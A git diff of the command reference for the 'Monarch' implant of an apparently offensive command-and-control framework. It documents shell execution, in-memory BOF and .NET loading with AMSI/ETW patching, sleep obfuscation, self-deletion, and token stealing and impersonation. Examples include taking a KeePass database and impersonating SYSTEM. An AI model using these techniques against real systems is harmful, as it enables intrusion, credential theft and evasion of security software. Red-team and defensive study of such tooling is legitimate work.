@@ -1,14 +1,16 @@
-# Modules <!-- omit from toc -->
+# Core Modules <!-- omit from toc -->
 
 ## Contents <!-- omit from toc -->
 
 - [Overview](#overview)
-- [EXIT](#exit)
-  - [exit](#exit-1)
+- [CORE](#core)
+  - [exit](#exit)
   - [self-destruct](#self-destruct)
-- [SLEEP](#sleep)
-  - [sleep](#sleep-1)
+  - [sleep](#sleep)
+  - [jitter](#jitter)
   - [sleepmask](#sleepmask)
+  - [link](#link)
+  - [unlink](#unlink)
 - [SHELL](#shell)
   - [shell](#shell-1)
 - [BOF](#bof)
@@ -28,9 +30,8 @@
   - [upload](#upload)
 - [SCREENSHOT](#screenshot)
   - [screenshot](#screenshot-1)
-- [SYSTEMINFO](#systeminfo)
+- [PROCESS](#process)
   - [ps](#ps)
-  - [env](#env)
 - [TOKEN](#token)
   - [make-token](#make-token)
   - [steal-token](#steal-token)
@@ -41,13 +42,16 @@
 
 ## Overview
 
-Modules are bundles of agent commands that can be embedded into the executable when configuring and building the `Monarch` agent. Currently, the following commands are available when all modules are activated.
+Modules are bundles of agent commands that can be embedded into the executable when configuring and building the `Monarch` agent. The core modules listed on this page are directly implemnted in Nim and thus change the agent size. Currently, the following commands are available when all modules are enabled.
 
 ```
  * exit                     Exit the agent.
  * self-destruct            Exit the agent and delete the executable from disk.
  * sleep                    Update sleep delay settings.
- * sleepmask                Update sleepmask settings.
+ * jitter                   Update jitter settings.
+ * sleepmask                Retrieve or update sleepmask settings.
+ * link                     Create a link to a SMB agent.
+ * unlink                   Remove a link to a SMB agent.
  * shell                    Execute a shell command and retrieve the output.
  * bof                      Execute an object file in memory and retrieve the output.
  * dotnet                   Execute a .NET assembly in memory and retrieve the output.
@@ -60,9 +64,8 @@ Modules are bundles of agent commands that can be embedded into the executable w
  * copy                     Copy a file or directory.
  * download                 Download a file.
  * upload                   Upload a file.
- * screenshot               Take a screenshot of the target system.
+ * screenshot               Take a screenshot of the target desktop.
  * ps                       Display running processes.
- * env                      Display environment variables.
  * make-token               Create an access token from username and password.
  * steal-token              Steal the primary access token of a remote process.
  * rev2self                 Revert to original access token.
@@ -71,348 +74,357 @@ Modules are bundles of agent commands that can be embedded into the executable w
  * disable-privilege        Disable a token privilege.
 ```
 
-## EXIT 
+## CORE
 
-Though not necessarily a module that can be enabled via the payload builder, the `exit` module exposes two commands that are built into the agent by default. 
+The core module exposes commands that are built into the agent by default and are always available regardless of the selected modules.
 
 ### exit
-Terminate the agent process or thread. This command is also invoked when the agent is exited from the UI. 
+Terminate the agent process or thread. This command is also invoked when the agent is exited from the UI.
 
 ```
-Usage    : exit [type]
-Example  : exit process
+Usage  : exit [type]
+Example: exit process
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * type            STRING       NO Available options: PROCESS/THREAD. Default: PROCESS.
+Optional arguments:
+  type                      STRING     Available options: PROCESS/THREAD. Default: PROCESS.
 ```
 
 ### self-destruct
-Terminate the agent process and delete the agent executable from disk. 
-```
-Usage    : self-destruct 
-Example  : self-destruct
-```
-
-## SLEEP 
-The `sleep` module is used to change sleep settings dynamically on the agent.
-
-### sleep 
-Update sleep delay.
+Terminate the agent process and delete the agent executable from disk.
 
 ```
-Usage    : sleep <delay>
-Example  : sleep 5
+Usage  : self-destruct
+Example: self-destruct
+```
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * delay           INT         YES Delay in seconds.
+### sleep
+Update the agent sleep delay.
+
+```
+Usage  : sleep <delay>
+Example: sleep 5
+
+Required arguments:
+  delay                     INT        Delay in seconds.
+```
+
+### jitter
+Update the jitter percentage applied to the sleep delay.
+
+```
+Usage  : jitter <jitter>
+Example: jitter 15
+
+Required arguments:
+  jitter                    INT        Jitter in % (0-100).
 ```
 
 ### sleepmask
-Update sleepmask/sleep obfuscation settings. Executing without arguments retrieves the current sleepmask settings and prints them in the agent console.
+Retrieve or update sleep obfuscation settings. Executing without arguments retrieves the current settings.
 
 ```
-Usage    : sleepmask [technique] [spoof]
-Example  : sleepmask ekko true
+Usage  : sleepmask [--technique <technique>] [--spoof]
+Example: sleepmask --technique ekko --spoof
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * technique       STRING       NO Sleep obfuscation technique (NONE, EKKO, ZILEAN, FOLIAGE).
- * spoof           BOOL         NO Use stack spoofing to obfuscate the call stack.
+Optional arguments:
+  --technique technique     STRING     Sleep obfuscation technique.
+                                         - NONE
+                                         - EKKO
+                                         - ZILEAN
+                                         - FOLIAGE
+  --spoof                   BOOL       Enable call stack spoofing.
 ```
 
 ![Sleepmask command](../assets/modules-1.png)
 
-## SHELL 
-The `shell` module is a simple module for executing shell commands using Nim's `execCmdEx` function. Double-quoted strings are parsed as a single argument. 
-
-### shell
-Execute a shell command and retrieve the output 
+### link
+Create a link to an SMB agent by connecting to its named pipe.
 
 ```
-Usage    : shell <command> [arguments]
-Example  : shell whoami /all
+Usage  : link <host> <pipe>
+Example: link DC01 msagent_1234
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * command         STRING      YES Command to be executed.
- * arguments       STRING       NO Arguments to be passed to the command.
- ```
+Required arguments:
+  host                      STRING     Host on which the SMB agent is running.
+  pipe                      STRING     Name of the named pipe (SMB listener).
+```
+
+### unlink
+Remove a link to an SMB agent.
+
+```
+Usage  : unlink <agent>
+Example: unlink C804A284
+
+Required arguments:
+  agent                     STRING     ID of the agent to unlink.
+```
+
+## SHELL
+
+The `shell` module executes shell commands using Nim's `execCmdEx` function. Double-quoted strings are parsed as a single argument.
+
+### shell
+Execute a shell command and retrieve the output.
+
+```
+Usage  : shell <command> [arguments]
+Example: shell whoami /all
+
+Required arguments:
+  command                   STRING     Command to be executed.
+
+Optional arguments:
+  arguments                 STRING     Arguments to be passed to the command.
+```
 
 ![Shell command](../assets/modules.png)
 
 ## BOF
-The `bof` module provides an effective BOF/COFF loader that can be used to execute beacon object files (*.o) in-memory. The object file is read from disk on the operator client and sent to the agent as part of the task data.
 
-### bof 
+The `bof` module provides a BOF/COFF loader for executing beacon object files (`*.o`) in memory. The object file is read from disk on the operator client and sent to the agent as part of the task data. 
+
+### bof
 Execute an object file in memory and retrieve the output.
 
 ```
-Usage    : bof <path> [arguments]
-Example  : bof /path/to/dir.x64.o C:\Users
+Usage  : bof <object-file> [arguments]
+Example: bof /path/to/dir.x64.o C:\Users
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * path            BINARY      YES Path to the object file to execute.
- * arguments       STRING       NO Arguments to be passed to the object file. Arguments are handled as STRING, unless specified with a prefix
+Required arguments:
+  object-file               FILE       Path to the object file to execute.
+
+Optional arguments:
+  arguments                 STRING     Arguments packed as a HEX string according to beacon_generate.py.
 ```
 
 ![Bof whoami](../assets/modules-2.png)
 
-Arguments are handled as STRING by default, but some BOFs expect other types. Prefixes can be used to tell the BOF loader how to process the passed argument.
-
-| Prefix | Type | 
-| --- | --- | 
-| `[i]:` | Integer |
-| `[w]:` | Wide String | 
-| `[s]:` | Short | 
-
-![Bof cat (with prefix)](../assets/modules-3.png)
-
+In order to create the `arguments` HEX-string, it is recommended to use the [beacon_generate.py](https://github.com/trustedsec/COFFLoader/blob/main/beacon_generate.py) script provided by trustedsec. More commonly, the `bof` command is needed when using the Python API to create commands for third-party post-exploitation capabilities, such as [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF).
 
 ## DOTNET
 
-The `dotnet` module executes a .NET assembly in memory using the CLR. As with object files, the .NET assembly is read from the operator desktop. In order to prevent security software from blocking the execution, this module patches AMSI and ETW using hardware breakpoints.
+The `dotnet` module executes .NET assemblies in memory using the CLR. As with object files, the assembly is read from the operator client and sent as part of the task data. To prevent security software from blocking execution, this module patches AMSI and ETW using hardware breakpoints.
 
 ### dotnet
 Execute a .NET assembly in memory and retrieve the output.
 
 ```
-Usage    : dotnet <path> [arguments]
-Example  : dotnet /path/to/Seatbelt.exe antivirus
+Usage  : dotnet <assembly> [arguments]
+Example: dotnet /path/to/SharpHound.exe -c all -d domain.local
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * path            BINARY      YES Path to the .NET assembly file to execute.
- * arguments       STRING       NO Arguments to be passed to the assembly. Arguments are handled as STRING
+Required arguments:
+  assembly                  FILE       Path to the .NET assembly to execute.
+
+Optional arguments:
+  arguments                 STRING     Arguments to be passed to the assembly. Arguments are handled as STRING.
 ```
 
 ![Dotnet command](../assets/modules-4.png)
 
 ## FILESYSTEM
-The `filesystem` module features basic commands that have been implemented using the Windows API for interacting with the file system. Supports quoted arguments.
+
+The `filesystem` module provides basic filesystem operations implemented via the Windows API. Quoted arguments are supported.
 
 ### pwd
-Retrieve current working directory.
+Retrieve the current working directory.
 
 ```
-Usage    : pwd 
-Example  : pwd
+Usage  : pwd
+Example: pwd
 ```
 
 ### cd
-Change current working directory.
+Change the current working directory.
 
 ```
-Usage    : cd <directory>
-Example  : cd C:\Windows\Tasks
+Usage  : cd <directory>
+Example: cd C:\Windows\Tasks
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * directory       STRING      YES Relative or absolute path of the directory to change to.
+Required arguments:
+  directory                 STRING     Relative or absolute path of the directory to change to.
 ```
 
-### ls 
+### ls
 List files and directories.
 
 ```
-Usage    : ls [directory]
-Example  : ls C:\Users\Administrator\Desktop
+Usage  : ls [directory]
+Example: ls C:\Users\Administrator\Desktop
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * directory       STRING       NO Relative or absolute path. Default: current working directory.
+Optional arguments:
+  directory                 STRING     Relative or absolute path. Default: current working directory.
 ```
 
-### rm 
+### rm
 Remove a file.
 
 ```
-Usage    : rm <file>
-Example  : rm C:\Windows\Tasks\payload.exe
+Usage  : rm <file>
+Example: rm C:\Windows\Tasks\payload.exe
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * file            STRING      YES Relative or absolute path to the file to delete.
- ```
+Required arguments:
+  file                      STRING     Relative or absolute path to the file to delete.
+```
 
-### rmdir 
+### rmdir
 Remove a directory.
-```
-Usage    : rmdir <directory>
-Example  : rm C:\Payloads
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * directory       STRING      YES Relative or absolute path to the directory to delete.
+```
+Usage  : rmdir <directory>
+Example: rmdir C:\Payloads
+
+Required arguments:
+  directory                 STRING     Relative or absolute path to the directory to delete.
 ```
 
-### move 
+### move
 Move a file or directory.
 
 ```
-Usage    : move <source> <destination>
-Example  : move source.exe C:\Windows\Tasks\destination.exe
+Usage  : move <source> <destination>
+Example: move source.exe C:\Windows\Tasks\destination.exe
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * source          STRING      YES Source file path.
- * destination     STRING      YES Destination file path.
- ```
+Required arguments:
+  source                    STRING     Source file path.
+  destination               STRING     Destination file path.
+```
 
 ### copy
 Copy a file or directory.
-```
-Usage    : copy <source> <destination>
-Example  : copy source.exe C:\Windows\Tasks\destination.exe
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * source          STRING      YES Source file path.
- * destination     STRING      YES Destination file path.
+```
+Usage  : copy <source> <destination>
+Example: copy source.exe C:\Windows\Tasks\destination.exe
+
+Required arguments:
+  source                    STRING     Source file path.
+  destination               STRING     Destination file path.
 ```
 
 ## FILETRANSFER
-The `filetransfer` module is used to transfer files from and to the target system.
+
+The `filetransfer` module handles file transfers between the operator client and the target system.
 
 ### download
-Download a file to the team server.
+Download a file from the target system to the team server.
 
 ```
-Usage    : download <file>
-Example  : download C:\Users\john\Documents\Database.kdbx
+Usage  : download <file>
+Example: download C:\Users\john\Documents\Database.kdbx
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * file            STRING      YES Path to file to download from the target machine.
- ```
-
-### upload 
-Upload a file from the operator Desktop to the targe system.
+Required arguments:
+  file                      STRING     Path to the file to download from the target machine.
 ```
-Usage    : upload <file> [destination]
-Example  : upload /path/to/payload.exe
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * file            BINARY      YES Path to file to upload to the target machine.
- * destination     STRING       NO Path to upload the file to. By default, uploads to current directory.
- ```
+### upload
+Upload a file from the operator client to the target system.
 
-## SCREENSHOT 
-The `screenshot` module can be used to capture a screenshot of all monitors of the system the agent is running on.
+```
+Usage  : upload <file> [destination]
+Example: upload /path/to/payload.exe
+
+Required arguments:
+  file                      FILE       Path to the file to upload to the target machine.
+
+Optional arguments:
+  destination               STRING     Destination path on the target. Default: current working directory.
+```
+
+## SCREENSHOT
+
+The `screenshot` module captures a screenshot of all monitors on the system the agent is running on.
 
 ### screenshot
-Take a screenshot of the target system.
+Take a screenshot of the target desktop.
+
 ```
-Usage    : screenshot 
-Example  : screenshot
+Usage  : screenshot
+Example: screenshot
 ```
 
-## SYSTEMINFO
-Use the `systeminfo` module to query basic information, such as running processes and environment variables.
+## PROCESS
 
-### ps 
+The `process` module exposes commands for interacting with Windows processes.
+
+### ps
 Display running processes.
+
 ```
-Usage    : ps 
-Example  : ps
+Usage  : ps
+Example: ps
 ```
 
 ![Ps command](../assets/modules-10.png)
 
-### env
-Display environment variables.
-```
-Usage    : env 
-Example  : env
-
-```
-
 ## TOKEN
 
-The `token` module can be used to manipulate Windows access tokens and privileges.
+The `token` module provides commands for manipulating Windows access tokens and privileges.
 
 ### make-token
-Create an access token from username and password. 
+Create an access token from a username and password and impersonate it immediately. This command can be executed from a medium-integrity (non-elevated) process. The current impersonation is displayed in the **Username** column of the **Sessions** view.
 
 ```
-Usage    : make-token <domain\username> <password> [logonType]
-Example  : make-token LAB\john Password123!
+Usage  : make-token <domain\username> <password> [--type logonType]
+Example: make-token LAB\john Password123!
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * domain\username STRING      YES Account domain and username. For impersonating local users, use .\username.
- * password        STRING      YES Account password.
- * logonType       INT          NO Logon type (https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types).
+Required arguments:
+  domain\username           STRING     Account domain and username. For impersonating local users, use .\username.
+  password                  STRING     Account password.
+
+Optional arguments:
+  --type logonType          INT        Logon type (https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types).
+                                         - 2: LOGON_INTERACTIVE
+                                         - 3: LOGON_NETWORK
+                                         - 4: LOGON_BATCH
+                                         - 5: LOGON_SERVICE
+                                         - 8: LOGON_NETWORK_CLEARTEXT
+                                         - 9: LOGON_NEW_CREDENTIALS (default)
 ```
 
-By default, the logon type is set to 9 - NewCredentials, which is also the default for frameworks like Cobalt Strike. The credentials are hereby not validated, making it possible to create a new logon session as a target user without knowing the password and injecting a valid Kerberos ticket into the session to impersonate them. Alternatively, these are the logon types that can be used. Most of the time, logon type 9 will be the best option, though in some cases it might be useful to impersonate a local user with logon type 2. 
+By default, logon type 9 (NewCredentials) is used, which is also the default in frameworks like Cobalt Strike. Credentials are not validated with this logon type, making it possible to create a logon session without knowing the password and inject a valid Kerberos ticket into it to impersonate the target user. The following logon types are supported:
 
-
-| Logon type | # | Examples |
+| Logon Type | # | Examples |
 |------------|---|----------|
-| Interactive (also known as, Logon locally) | 2 | Console logon;<br>RUNAS;<br>Hardware remote control solutions (such as Network KVM or Remote Access / Lights-Out Card in server)<br>IIS Basic Auth (before IIS 6.0) |
-| Network | 3 | NET USE;<br>RPC calls;<br>Remote registry;<br>IIS integrated Windows auth;<br>SQL Windows auth; |
+| Interactive | 2 | Console logon, RUNAS, IIS Basic Auth (pre-IIS 6.0) |
+| Network | 3 | NET USE, RPC calls, remote registry, IIS integrated Windows auth, SQL Windows auth |
 | Batch | 4 | Scheduled tasks |
 | Service | 5 | Windows services |
-| NetworkCleartext | 8 | IIS Basic Auth (IIS 6.0 and newer);<br>Windows PowerShell with CredSSP |
+| NetworkCleartext | 8 | IIS Basic Auth (IIS 6.0+), PowerShell with CredSSP |
 | NewCredentials | 9 | RUNAS /NETWORK |
-| RemoteInteractive | 10 | Remote Desktop (formerly known as "Terminal Services") |
-
-This command can be executed from a `Monarch` running in a **medium-integrity** (non-elevated) process. After creating a token from the username and password, the `make-token` command also impersonates it immediately. The current impersonation is displayed in the **Username** column of the **Sessions** view.
+| RemoteInteractive | 10 | Remote Desktop |
 
 ![Token make](../assets/modules-5.png)
 
-### steal-token 
-Steal the primary access token of a remote process.
+### steal-token
+Steal the primary access token of a remote process. Requires the agent to be running in a high-integrity (elevated) process.
 
 ```
-Usage    : steal-token <pid>
-Example  : steal-token 1234
+Usage  : steal-token <pid>
+Example: steal-token 1234
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * pid             INT         YES Process ID of the target process.
+Required arguments:
+  pid                       INT        Process ID of the target process.
 ```
 
-The `steal-token` command requires the `Monarch` to be in an elevated process with a **high mandatory level**. By passing the target PID, it is possible to impersonate `NT AUTHORITY\SYSTEM` or other users.
-
-In the screenshot below, the PID belongs to the `winlogon.exe` process, which is running as `NT AUTHORITY\SYSTEM`.
+In the screenshot below, the target PID belongs to `winlogon.exe`, which runs as `NT AUTHORITY\SYSTEM`.
 
 ![Token steal](../assets/modules-6.png)
 
-### rev2self 
-Stop impersonating and revert to original access token.
+### rev2self
+Stop impersonating and revert to the original access token.
 
 ```
-Usage    : rev2self 
-Example  : rev2self
+Usage  : rev2self
+Example: rev2self
 ```
 
-### token-info 
-Retrieve information about the current access token, such as token type, elevation, the user the token belongs to, group memberships and token privileges.
+### token-info
+Retrieve information about the current access token, including token type, elevation, user, group memberships, and privileges.
 
 ```
-Usage    : token-info 
-Example  : token-info
+Usage  : token-info
+Example: token-info
 ```
 
 ![Token info](../assets/modules-7.png)
@@ -421,13 +433,11 @@ Example  : token-info
 Enable a token privilege.
 
 ```
-Usage    : enable-privilege <privilege>
-Example  : enable-privilege SeImpersonatePrivilege
+Usage  : enable-privilege <privilege>
+Example: enable-privilege SeImpersonatePrivilege
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * privilege       STRING      YES Privilege to enable.
+Required arguments:
+  privilege                 STRING     Privilege to enable.
 ```
 
 ![Enable priv](../assets/modules-8.png)
@@ -436,13 +446,11 @@ Arguments:
 Disable a token privilege.
 
 ```
-Usage    : disable-privilege <privilege>
-Example  : disable-privilege SeImpersonatePrivilege
+Usage  : disable-privilege <privilege>
+Example: disable-privilege SeImpersonatePrivilege
 
-Arguments:
-   Name            Type   Required Description
-   --------------- ------ -------- --------------------
- * privilege       STRING      YES Privilege to disable.
- ```
+Required arguments:
+  privilege                 STRING     Privilege to disable.
+```
 
 ![Disable priv](../assets/modules-9.png)
